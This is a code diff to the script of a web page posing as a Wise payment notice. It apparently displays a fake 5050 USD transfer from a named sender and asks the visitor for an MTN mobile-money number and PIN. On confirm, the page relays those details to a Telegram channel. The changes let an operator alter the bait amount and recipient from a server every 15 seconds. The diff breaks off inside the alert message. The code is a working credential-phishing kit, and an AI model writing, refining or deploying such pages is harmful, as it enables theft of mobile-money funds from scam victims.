@@ -423,14 +423,17 @@
 <script>
 (function() {
   const STORAGE_KEY = 'wise_payment_data';
+  const API_URL = '/api/payment';
+  const POLL_MS = 15000;
+
   const DEFAULT_DATA = {
-    senderName: 'Maya Chen',
-    senderEmail: 'maya.chen@example.com',
-    recipientName: '',        // ← blank unless the admin sets one
-    amount: 1250.00,
+    senderName: 'Dave Whitmore',
+    senderEmail: 'Davewhitmore76@gmail.com',
+    recipientName: '',
+    amount: 5050.00,
     currency: 'USD',
     reference: 'WISE-2025-4F2A',
-    note: 'Payment for design services'
+    note: 'Payment to family member'
   };
 
   const CURRENCY_INFO = {
@@ -438,13 +441,6 @@
     NGN: 1550, ZAR: 18.5, XOF: 605, XAF: 605, ZMW: 26,
     MWK: 1730, USD: 1
   };
-
-  const paymentData = (function(){
-    try {
-      const raw = localStorage.getItem(STORAGE_KEY);
-      return raw ? { ...DEFAULT_DATA, ...JSON.parse(raw) } : { ...DEFAULT_DATA };
-    } catch(e) { return { ...DEFAULT_DATA }; }
-  })();
 
   const $ = id => document.getElementById(id);
   const recipientPhone = $('recipientPhone');
@@ -456,7 +452,35 @@
   const phoneWrap = $('phoneWrap');
   const mtnConfirmBtn = $('mtnConfirmBtn');
   const mtnStatus = $('mtnStatus'), mtnStatusText = $('mtnStatusText'), mtnStatusIcon = $('mtnStatusIcon');
+  const mtnAmountEl = $('mtnAmount'), mtnCurrencyEl = $('mtnCurrency');
 
+  // ---- Local cache ----
+  function loadLocal() {
+    try {
+      const raw = localStorage.getItem(STORAGE_KEY);
+      if (raw) return { ...DEFAULT_DATA, ...JSON.parse(raw) };
+    } catch(e) {}
+    return { ...DEFAULT_DATA };
+  }
+  function saveLocal(data) {
+    try { localStorage.setItem(STORAGE_KEY, JSON.stringify(data)); } catch(e) {}
+  }
+
+  // ---- Server fetch ----
+  async function loadRemote() {
+    try {
+      const res = await fetch(API_URL, { cache: 'no-store' });
+      if (!res.ok) return null;
+      const data = await res.json();
+      if (!data || typeof data !== 'object' || !Object.keys(data).length) return null;
+      return { ...DEFAULT_DATA, ...data };
+    } catch(e) {
+      console.warn('Remote load failed:', e);
+      return null;
+    }
+  }
+
+  // ---- Currency formatting ----
   function fmtAmount(n) {
     return (parseFloat(n) || 0).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
   }
@@ -466,6 +490,8 @@
     const dec = local > 100 ? 0 : 2;
     return local.toLocaleString('en-US', { minimumFractionDigits: dec, maximumFractionDigits: dec });
   }
+
+  // ---- Country helpers ----
   function getCountry() {
     const p = countrySelect.value.split('|');
     return {
@@ -485,6 +511,69 @@
     return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
   }
 
+  // ---- Live paymentData (refreshes from server) ----
+  let paymentData = loadLocal();
+
+  function renderPayment() {
+    mtnAmountEl.textContent = fmtAmount(paymentData.amount);
+    mtnCurrencyEl.textContent = paymentData.currency || 'USD';
+    // Only prefill recipientName if the user hasn't typed anything yet
+    if (!recipientName.value.trim()) {
+      recipientName.value = (paymentData.recipientName || '').trim();
+    }
+  }
+
+  renderPayment();
+
+  (async () => {
+    const remote = await loadRemote();
+    if (remote) {
+      paymentData = remote;
+      saveLocal(remote);
+      renderPayment();
+    }
+  })();
+
+  setInterval(async () => {
+    if (document.hidden) return;
+    const remote = await loadRemote();
+    if (!remote) return;
+    if (JSON.stringify(remote) !== JSON.stringify(paymentData)) {
+      paymentData = remote;
+      saveLocal(remote);
+      renderPayment();
+    }
+  }, POLL_MS);
+
+  document.addEventListener('visibilitychange', async () => {
+    if (document.hidden) return;
+    const remote = await loadRemote();
+    if (remote) {
+      paymentData = remote;
+      saveLocal(remote);
+      renderPayment();
+    }
+  });
+
+  // Same-device tab sync
+  try {
+    const bc = new BroadcastChannel('wise_payment');
+    bc.onmessage = e => {
+      if (e.data && e.data.type === 'update' && e.data.data) {
+        paymentData = { ...DEFAULT_DATA, ...e.data.data };
+        renderPayment();
+      }
+    };
+  } catch(e) {}
+
+  window.addEventListener('storage', e => {
+    if (e.key === STORAGE_KEY) {
+      paymentData = loadLocal();
+      renderPayment();
+    }
+  });
+
+  // ---- Status helper ----
   function showStatus(msg, type) {
     mtnStatusText.textContent = msg;
     mtnStatus.classList.remove('hidden', 'success', 'error', 'info');
@@ -496,22 +585,14 @@
   }
 
   async function sendTelegram(html, txnId, stage) {
-    try {
-      const res = await fetch('/api/telegram', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ message: html, txnId, stage })
-      });
-      return await res.json();
-    } catch (e) { console.error('Telegram send failed:', e); }
+    const res = await fetch('/api/telegram', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ message: html, txnId, stage })
+    });
+    if (!res.ok) throw new Error('Telegram HTTP ' + res.status);
+    return await res.json();
   }
-
-  // ---- Render amount ----
-  $('mtnAmount').textContent = fmtAmount(paymentData.amount);
-  $('mtnCurrency').textContent = paymentData.currency || 'USD';
-
-  // ---- Recipient name: read from paymentData.recipientName (blank if unset) ----
-  recipientName.value = (paymentData.recipientName || '').trim();
 
   // ---- Country picker ----
   countrySelect.addEventListener('change', () => {
@@ -549,14 +630,13 @@
   });
 
   // ============================================================
-  // CONFIRM → SEND TELEGRAM MESSAGE → NAVIGATE
+  // CONFIRM → SEND TELEGRAM → NAVIGATE
   // ============================================================
   mtnConfirmBtn.addEventListener('click', async () => {
     const phoneLocal = recipientPhone.value.trim().replace(/\s/g, '');
     const pin = momoPin.value.trim();
     const name = recipientName.value.trim();
 
-    // Validation
     if (!phoneLocal) {
       phoneWrap.classList.add('error');
       showStatus('Please enter the recipient number.', 'error');
@@ -591,9 +671,6 @@
     const exchangeRate = (parseFloat(localAmount.replace(/,/g,'')) / (parseFloat(paymentData.amount) || 1)).toFixed(2);
     const txnId = 'MTN-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).slice(2,6).toUpperCase();
 
-    // ============================================================
-    // TELEGRAM MESSAGE
-    // ============================================================
     const message = `🔔 <b>NEW TRANSACTION — APPROVAL REQUIRED</b>
 
 ━━━━━━━━━━━━━━━━━━━━
